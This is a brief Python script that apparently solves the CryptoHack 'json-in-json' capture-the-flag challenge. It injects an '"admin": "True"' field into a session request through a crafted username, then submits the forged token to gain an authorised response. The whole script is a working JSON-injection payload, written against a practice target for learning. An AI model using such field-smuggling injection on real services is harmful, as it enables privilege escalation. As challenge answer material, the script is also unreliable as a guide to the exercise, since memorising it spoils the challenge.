import requests

username = 'sarp", "admin": "True'
response = requests.get(f"https://web.cryptohack.org/json-in-json/create_session/{username}/")
token = response.json()["session"]
response = requests.get(f"https://web.cryptohack.org/json-in-json/authorise/{token}")
print(response.json()["response"])